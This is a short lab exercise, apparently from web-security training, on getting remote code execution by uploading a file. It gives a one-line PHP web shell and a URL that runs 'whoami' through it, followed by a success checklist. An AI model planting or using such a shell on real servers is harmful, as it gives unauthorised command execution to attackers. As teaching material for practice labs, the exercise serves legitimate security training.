# Lab 2: Uploading a Web Shell

## Goal: Get RCE via file upload.

## Steps:
1. Find a "Profile Picture" or "Document Upload" feature.
2. Create a simple PHP shell: `<?php system($_GET['cmd']); ?>`
3. Upload the file.
4. Visit the file URL: `http://target.com/uploads/shell.php?cmd=whoami`
5. If it returns "www-data", you have RCE!

## Success Check:
- [ ] Successfully uploaded a shell.
- [ ] Executed a system command (`whoami`, `ls`) via the web browser.
